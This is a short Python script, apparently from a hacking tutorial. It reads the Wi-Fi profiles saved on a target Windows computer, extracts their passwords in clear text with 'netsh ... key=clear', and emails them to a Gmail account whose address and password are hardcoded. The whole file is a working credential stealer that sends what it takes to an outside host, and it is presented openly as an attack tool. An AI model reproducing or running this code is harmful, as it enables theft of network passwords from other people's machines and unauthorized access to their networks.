import subprocess, smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile" # Show all networks the target has connected to in the past
# command can be windows/linux/OsX commands
networks = subprocess.check_output(command, shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)",networks) # \s* means any no of blank spaces. ?: tells not to include profile in the result. () means groups
# Returns all matching wifi names in a list
#print(network_names) # Prints a list of all wifi networks ever connected on the target computer
result = ""
for network_name in network_names:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell = True)
    result = result + current_result

send_mail("dummylegacy69@gmail.com", "dummylegacy1234", result)
